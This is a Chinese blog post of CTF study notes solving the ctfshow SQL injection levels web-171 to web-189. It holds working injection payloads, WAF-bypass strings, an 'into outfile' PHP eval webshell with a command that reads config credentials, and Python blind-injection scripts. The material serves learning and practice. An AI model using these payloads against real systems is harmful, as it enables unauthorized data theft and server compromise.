---
title: ctfshow-sql注入
date: 2025-03-04 23:42:23
tags:
- sql注入
category:
- 学习笔记
---

# sql注入

## web-171（无过滤字符型注入）

查询语句

```
//拼接sql语句查找指定ID用户
$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

解题思路：

**无过滤的字符型注入**

payload步骤：

```
1 or 1=2 --+	//正常回显id为1的用户，排除数字型，判断为字符型

1' or 1=1 --+	//使用注释符得到flag
或者
1' or '1' = '1	//手工闭合得到flag
```

---

## web-172（无过滤字符型注入、union联合查询）

查询语句

```
//拼接sql语句查找指定ID用户
$sql = "select username,password from ctfshow_user2 where username !='flag' and id = '".$_GET['id']."' limit 1;";
      
```

返回逻辑

```
//检查结果是否有flag
    if($row->username!=='flag'){
      $ret['msg']='查询成功';
    }  
```

解题思路：

**添加限制条件 name!=‘flag’ 输出的username中不能有flag**

**所以只能用union联合查询了，走流程**

**爆库名->爆表名->爆列名->爆字段值**

payload构造步骤：

```
//判断是字符型注入
1 or 1=2 --+	
//判断为单引号闭合
1' and 1=1 --+ 	
//测出此表有2列
1' order by 2 --+	
//爆出库名为ctfshow_web
-1' union select 1,database() --+	
//爆出两表名ctfshow_user,ctfshow_user2
-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema = 'ctfshow_web' --+	
//爆出列名id,username,password
-1' union select 1,group_concat(column_name) from information_schema.columns where table_name = 'ctfshow_user2' --+	
//根据列名爆出数据得到flag
-1' union select 1,group_concat(username,'-',password) from ctfshow_user2  --+	//爆出全部数据
或者直接筛选flag
-1' union select 1,group_concat(username,'-',password) from ctfshow_user2 where username = 'flag' --+
```

---

## web-173（字符型注入、hex函数绕过正则过滤flag）

查询语句

```
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user3 where username !='flag' and id = '".$_GET['id']."' limit 1;";
      
```

返回逻辑

```
//检查结果是否有flag
    if(!preg_match('/flag/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

解题思路：

**返回数据会检查是否有username='flag'，但是我们不查username字段就行了，或者将username字段使用hex函数编码**

**还有一种方法就是将flag替换**

payload：

```
前面同样的步骤，这里不写了，区别在于这里有3列，并且flag所在表名为ctfshow_user3，直接不带username字段联合查询
-1' union select 1,2,group_concat(password) from ctfshow_user3 where username='flag' --+

或者
因为字段中不允许出现flag  所以直接把字段改成hex()格式 ，这样就避开 了，
于是出现的一行中，显示为666C6167 这正是’flag'这hex() 格式，  后面的flag 正是
-1' union select 1,hex(username),password from ctfshow_user3 where username='flag' --+

或者
替换"flag"，满足检测，这里把flag中的f换成g就能满足检测了
-1' union select id,replace(username,'f','g'),password from ctfshow_user3 where username = 'flag' --+
```

---

## web-174（正则过滤数字、replace函数绕过、盲注）

查询语句

```
//拼接sql语句查找指定ID用户
$sql = "select username,password from ctfshow_user4 where username !='flag' and id = '".$_GET['id']."' limit 1;";
      
```

返回逻辑

```
//检查结果是否有flag
    if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

解题思路：

发现过滤了flag与数字，我们可以利用mysql的replace替换数字、或者使用盲注脚本（不知道为什么我这里失败了）

payload：

replace函数绕过做法

```
前面判断闭合类型和列数就不写了，单引号闭合，两列
//爆库名，因为数字被过滤了，这里用'a'来绕过，并且从这里开始要使用replace函数替换掉数字了	
爆出库名为ctfshow_web
-1' UNION SELECT 'a',REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(database(),'9','nine'),'8','eight'),'7','seven'),'6','six'),'5','five'),'4','four'),'3','three'),'2','two'),'1','one'),'0','zero') --+
//爆表名，查出表名为ctfshow_userfour，即ctfshow_user4
-1' UNION SELECT 'a',REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(group_concat(table_name),'9','nine'),'8','eight'),'7','seven'),'6','six'),'5','five'),'4','four'),'3','three'),'2','two'),'1','one'),'0','zero') from information_schema.tables where table_schema = 'ctfshow_web' --+
//爆列名，查出列名为id,username,password
-1' UNION SELECT 'a',REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(group_concat(column_name),'9','nine'),'8','eight'),'7','seven'),'6','six'),'5','five'),'4','four'),'3','three'),'2','two'),'1','one'),'0','zero') from information_schema.columns where table_name = 'ctfshow_user4' --+
//爆数据，这里把flag中的f替换为G来绕过，得到flag。
-1' UNION SELECT REPLACE(username,'f','G'), REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(password,'9','nine'),'8','eight'),'7','seven'),'6','six'),'5','five'),'4','four'),'3','three'),'2','two'),'1','one'),'0','zero') from ctfshow_user4 --+

得到flag为ctfshow{eightdsixabtwodb-onezerothreefive-fourbdd-bddtwo-zerodabbbbdonezeroeightc}
我们最后还要根据替换的字符解码
```

---

## web-175（正则过滤ascii 0-127绕过、利用into outfile写入webshell、时间盲注 ）

查询语句

```
//拼接sql语句查找指定ID用户
$sql = "select username,password from ctfshow_user5 where username !='flag' and id = '".$_GET['id']."' limit 1;";
      
```

返回逻辑

```
//检查结果是否有flag
    if(!preg_match('/[\x00-\x7f]/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
      
```

解题思路：

**过滤了 ascii 0-127，尝试从其他信道将数据带出，利用into outfile来实现文件的输出**

**还可以使用时间盲注，因为没有回显所以布尔盲注不行**

payload：

```
?id=1' union select 1,'<?php @eval($_POST[1]);?>' into outfile '/var/www/html/mixbp.php' --+
然后使用蚁剑连接
http://c3041e53-3cc6-410a-9f33-e55e57ee7b6b.challenge.ctf.show/mixbp.php	密码为1
这样我们就可以修改正则了。然后再次注入即可。


或者post传参1=system("tac ./api/config.php");得到数据库密码，然后连接数据库，使用select语句查找flag
```

时间盲注脚本：

```
import requests
import time
if __name__ == '__main__' :
    url = 'http://2a8873c8-47c9-4783-b056-ef2c97bdb9cb.challenge.ctf.show/api/?id='
    result = ''
    i = 0
    while True:
        i = i + 1
        low = 32
        high = 127
        while low < high:
            mid = (low + high) // 2
            payload = f'1\' and if(ascii(substr((select group_concat(database()) from information_schema.schemata),{i},1))>{mid},1,sleep(1)) --+'
            #payload = f'1\' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema="ctfshow"),{i},1))>{mid},1,sleep(2)) --+'
            #payload = f'1\' and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name="flagugs"),{i},1))>{mid},1,sleep(2)) --+'
            #payload = f'1\' and if(ascii(substr((select group_concat(flag43s) from ctfshow.flagugs),{i},1))>{mid},1,sleep(2)) --+'
            # print(payload)
            stime=time.time()
            r = requests.get(url=url + payload)
            if time.time()-stime<1:
                low = mid + 1
            else:
                high = mid
        if low != 32:
            result += chr(low)
        else:
            break
        print(result)
```

---

## web-176（大小写绕过select过滤）

查询语句

```
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";
      
```

返回逻辑

```
//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
```

解题思路：这里过滤了select，可以使用大小写绕过，但是没必要用联合查询，直接`1' or 1=1 --+`即可

payload：

```
万能密码
1' or 1=1 --+
或者
1' or '1'='1


使用union联合查询并用大小写绕过select过滤
//测出表有3列
1' order by 3 --+
//爆出库名为ctfshow_web
-1' union Select 1,2,database() --+	
//爆出表名ctfshow_user
-1' union Select 1,2,group_concat(table_name) from information_schema.tables where table_schema = 'ctfshow_web' --+	
//爆出列名id,username,password
-1' union Select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'ctfshow_user' --+	
//根据列名爆出数据得到flag
-1' union Select 1,2,group_concat(username,'-',password) from ctfshow_user where username='flag' --+	
```

---

## web-177（空格过滤绕过（/**/、%09））

查询语句

```
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";
      
```

返回逻辑

```
//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
     
```

解题思路：

有过滤的字符型注入，试了一下，对空格和`--+`有过滤，用 %09或者/**/注释符绕过空格过滤，用%23即#（这里只能用%23）绕过`--+`过滤。

```
前面爆库名爆表名爆列名默认流程
-1'%09union%09select%091,2,password%09from%09ctfshow_user%09where%09username='flag'%23

-1'/**/union/**/select/**/1,2,password/**/from/**/ctfshow_user/**/where/**/username='flag'%23

# ()中的空格也可用 ` 替代  某些情况下
-1'union/**/select/**/1,2,(select`password`from`ctfshow_user`where`username`='flag')%23

    
    
可替代空格
%0a
%0b
%0c
%0d
%09
%a0(在特定字符集才能利用)
以上均为URL编码

/**/组合
括号
%23代替注释符 -- 
```

---

## web-178（空格过滤绕过（%0b换行符、%09））

解题思路：

过滤掉了/**/ # ，所以不能用/\*\*/ 来代替空格了

**可以用换行符%0b或者%09来代替空格**

payload：

```
-1'%09union%09select%091,2,password%09from%09ctfshow_user%09where%09username='flag'%23

-1'%0bunion%0bselect%0b1,2,password%0bfrom%0bctfshow_user%0bwhere%0busername='flag'%23

万能密码一样可以 
-1'%0aor%0a1=1%0a%23
```

---

## we-179（空格过滤绕过（%0c））

解题思路：

有过滤的字符型注入，和上上题差不多，增加了对 `%09 %0a %0b %0d` 的过滤，%0c 可以用。

payload：

```
-1'%0cor%0c1=1%0c%23

-1'%0cunion%0cselect%0c1,2,password%0cfrom%0cctfshow_user%0cwhere%0cusername='flag'%23

()中的空格可用 ` 替代，这样更简单
-1'union%0cselect%0c1,2,(select`password`from`ctfshow_user`where`username`='flag')%23
```

---

## web-180（#(%23)注释符过滤绕过）

解题思路：

增加了对 `#(%23)` 的过滤，这里使用 -- (--后加个空格) 绕过。

```
# 避开结尾注释
-1'union%0cselect%0c1,(select`password`from`ctfshow_user`where`username`='flag'),'2
#有结尾注释   **%0c--%0c**
-1'%0cunion%0cselect%0c1,2,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername%0c=%0c'flag')%0c--%0c

-1'%0cunion%0cselect%0c1,2,password%0cfrom%0cctfshow_user%0cwhere%0cusername='flag'%0c--%0c

-1'%0cor%0c1=1%0c--%0c
```

---

## web-181（空格过滤绕过、逻辑运算优先级）

查询语句

```
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";
      
```

返回逻辑

```
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i', $str);
  }
      
```

**没有空格和 select 可以用，这里利用逻辑运算的优先级构造 and 语句，绕过查询语句前面的 username != flag，且不能含有空格**

**and>or**
**关于优先级问题就跟加减号与乘除号一样，and先运算，那么and的运算结果过程如何解释：需要同时满足两边的条件才会返回true那么这里就是让第一个and语句返回false让后面的and语句来做到知行的效果**

payload：

```
0'or(id=26)and'1'='1
and的优先级比or要高，故注入后的语句变成了
select id,username,password frpm ctfshow_user where username !='flag' and id = '0'or(id=26)and'1' limit 1;
前面满足条件id=0的记录不存在，故该语句可简化为
select id,username,password from ctfshow_user where (0) or(id=26)and'1' limit 1;
先计算and，再计算or，最后得到满足id=26的记录
```

---

## web-182（逻辑运算优先级、盲注）

返回逻辑

```
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i', $str);
  }
      
```

比上题多过滤了一个flag，依然可以用上题的payload，或者用盲注

payload：

```
0'or(id=26)and'1'='1

盲注payload，在and后写盲注语句即可
-1'or(id=26)andif(xxxx)
```

---

## web-183（count、python脚本进行like或正则匹配）

源码：

```
//拼接sql语句查找指定ID用户
  $sql = "select count(pass) from ".$_POST['tableName'].";";
      
```

返回逻辑

```
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i', $str);
  }

      
```

查询结果

```
//返回用户表的记录总数
      $user_count = 0;
```

解题思路：

这里会将我们传入的tableName值进行sql语句的拼接。所以我们可以利用前面的count加like匹配来爆破flag

python脚本：

```
import requests

url = 'http://c08bee29-77ce-4dc6-94e9-7dd98c17a11c.challenge.ctf.show/select-waf.php'
str = '{1234567890-abcdefghijklmnopqrstuvwxyz}'			//爆破字典
flag = ''	
for x in range(0,100):			//爆破位数，如果不确定flag的位数可以调大点
    for i in str:
        data = {'tableName':'`ctfshow_user`where`pass`like"ctfshow{}%"'.format(flag+i)}	
        r = requests.post(data=data,url=url)
        if r.text.find('$user_count = 1;') > 0:		//如果匹配成功，会输出$user_count = 1
            flag+=i
            print(flag)
            break
        else:
            continue		//没匹配到直接跳过
```

**注意：在拼接sql语句的时候，表名和列名要用反引号`围起来，或者使用圆括号()括起来，避免sql语句无法执行，因为sql中不能存在空格**

---

## web-184（group by绕过where过滤、十六进制绕过单双引号过滤、regexp）

where被禁用了。。。用group by代替
双引号单引号也被过滤了，**改为十六进制进行绕过**

```
import requests

url = "http://140e0424-a88d-4d4c-831f-b3d9390a7278.challenge.ctf.show/select-waf.php"

flagstr = "{abcdefghijklmnopqrstuvwxyz-0123456789}"
def to_hex(str):
    a = ""
    for x in str:
        a += hex(ord(x)).replace("0x","")
    return a
    
flag = ""
for i in range(0, 50):
    for x in flagstr:
        data = {
            "tableName":"ctfshow_user group by pass having pass regexp(0x{})".format(to_hex(flag + x))
        }
        r = requests.post(url,data=data)

        if (r.text.find("$user_count = 1;") > 0):
            flag += x
            print(flag)
        else:
            continue

```

注意：

```
1、这里where被过滤了所以可以用group by pass having pass语句代替where进行条件查询
2、由于过滤了单双引号所以要使用regexp(0x{})的格式，因为十六进制也能在mysql中被解析，且不用使用单双引号
比如regexp 'a'就相当于regexp(0x61)
```

---

## web-185（python脚本正则匹配、数字过滤绕过）

查询语句

```
//拼接sql语句查找指定ID用户
  $sql = "select count(*) from ".$_POST['tableName'].";";
      
```

返回逻辑

```
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);
  }
```

查询结果

```
//返回用户表的记录总数
      $user_count = 0;
```

过滤了数字，所以需要自己构造出数字

| expression                   | number |
| ---------------------------- | ------ |
| false                        | 0      |
| true                         | 1      |
| true+true                    | 2      |
| floor(pi())                  | 3      |
| ceil(pi())                   | 4      |
| floor(pi())+true             | 5      |
| floor(pi())+floor(pi())      | 6      |
| floor(pi())+ceil(pi())       | 7      |
| ceil(pi())+ceil(pi())        | 8      |
| floor(pi())*floor(pi())      | 9      |
| floor(pi())*floor(pi())+true | 10     |

**我们这里使用"true+true"的形式即可构造出0-9的数字**

**然后使用concat进行连接，并且过滤了 `"` `'` 不能使用 concat(‘str’,‘str’) 进行拼接，字符与数字都需要自己构造 通过chr() 函数将数字转义为字符**

python脚本：

```
import requests

url = "http://ec8ccd75-39a8-405b-a4b7-002d937996d0.challenge.ctf.show/select-waf.php"
flagstr = "{abcdefghijklmnopqrstuvwxyz-0123456789}"

def renum(n):
    a = 'true'
    for i in range(n-1):	#因为我们已经把a赋值为true所以只需要循环n-1次即可
        a += '+true'		
    return a[0:]
   

def renum_to_str(n):
    str = ""
    for i in n:
        str += ",chr("+renum(ord(i))+")"	
    return str[1:]			#需要去掉第0位的逗号,所以返回的是str[1:]
    
#ord先将字符转换为ascii码，然后再通过renum转换为true+true形式的ascii码，然后拼接成chr("true+true+...")的形式，就能绕过数字过滤了，在sql中会被组成chr("true+true+..."),chr("true+true+...")形式，然后经过concat函数拼接即可成为字符串

flag = "ctfshow{"	#初始化flag形式
for i in range(0,50):
    for x in flagstr:
        data = {"tableName":"ctfshow_user group by pass having pass regexp(concat({}))".format(renum_to_str(flag+x))	#还是使用regexp正则匹配flag
                }
        r = requests.post(url,data=data)
        if r.text.find('$user_count = 1;') > 0:
            flag += x
            print(flag)
        else:
            continue
```

---

## web-186（同上）

---

## web-187（mysql特性、md5）

查询语句

```
//拼接sql语句查找指定ID用户
  $sql = "select count(*) from ctfshow_user where username = '$username' and password= '$password'";
      
```

返回逻辑

```
    $username = $_POST['username'];
    $password = md5($_POST['password'],true);

    //只有admin可以获得flag
    if($username!='admin'){
        $ret['msg']='用户名不存在';
        die(json_encode($ret));
    }
```

解题思路：

分析返回逻辑发现我们传入的$username必须为admin才会进行下一步sql查询，否则就会报错，所以只能在password上入手。

**MySQL的一个特性： 只要'or'后面的字符串为一个非零的数字开头都会返回True**

**关键代码：**

**$password = md5($_POST['password'],true);**

**// 如果可选的binary被设置为true 那么md5摘要将以16字符长度的原始二进制格式返回**

**// 那么如果 md5($_POST['password'],true) 的返回值为 'or'1(除0外任意数字开头)xxx SQL语句将被拼接为**

**$sql="select count(*) from ctfshow_user where username='admin' and password=''or'1xxx'";**

**// 密码输入 ffifdyop**

**md5("ffifdyop",true) => 'or'6É]é!r,ùíb**

payload：

```
用户名：admin
密码：ffifdyop
```

点击登录并抓包放到重放器中然后发送，在响应包中就能看到flag

---

## web-188（mysql弱类型比较）

查询语句

```
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username}";
      
```

返回逻辑

```
  //用户名检测
  if(preg_match('/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断	
  if($row['pass']==intval($password)){	//php中如果字符串中第一个字符不为其他数字，则与0若比较恒等
      $ret['msg']='登陆成功';
      array_push($ret['data'], array('flag'=>$flag));
    }
      
```

**当一个字符串与数字比较时会把字符串转化为数字，如 `'4ad'=4`**
**而当数字为0，且字符串开头不为其他数字时，弱类型恒成立**

payload：

```
字符开头会被当作 0
所以当 username = 0 时 会返回列 pass 中所有以字符开头的值


username: 0
password: 0
```

---

## web-189（sql盲注、load_file函数读取文件、if）

查询语句

```
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username}";
```

返回逻辑

```
  //用户名检测
  if(preg_match('/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }
      
```

**此题提醒了flag在api/index.php, 大概率就是让用load_file来读取函数**

```
// username/pass 输入 0/0 输出 密码错误
// username/pass 输入 1/0 输出 查询失败
所以此题存在支持布尔盲注的条件


使用盲注, 利用上一题提到的特性,  当查询的username为字母开头时会自动转变成0和数字对比,  那么可以传入
user = 0 或者 1   (当user为0时,  会报错登录失败,  当user为1时,  会报错查询失败)
pass = 随意
```

python脚本：

```
import requests

url = "http://742e8e2f-6cee-40c4-a072-e021844a8844.challenge.ctf.show/api/index.php"
flagstr = "{abcdefghijklmnopqrstuvwxyz-0123456789}"


flag = "ctfshow{"
for i in range(0, 50):
    for x in flagstr:
        payload = "if(load_file('/var/www/html/api/index.php')regexp('{}'),0,1)".format(flag+x)	//如果成功匹配到就会为0，然后用户名即为0，就会返回密码错误，没匹配到就会返回1，然后登录会返回查询失败
        data = {"username":payload,"password":"123"}
        r = requests.post(url,data=data)
        if r.text.find(r'\u5bc6\u7801\u9519\u8bef') > 0:	//\u5bc6\u7801\u9519\u8bef为'密码错误'的unicode编码，前面加r可以取消\的转义作用使其变成普通字符
            flag += x
            print(flag)
            break
        else:
            continue
```

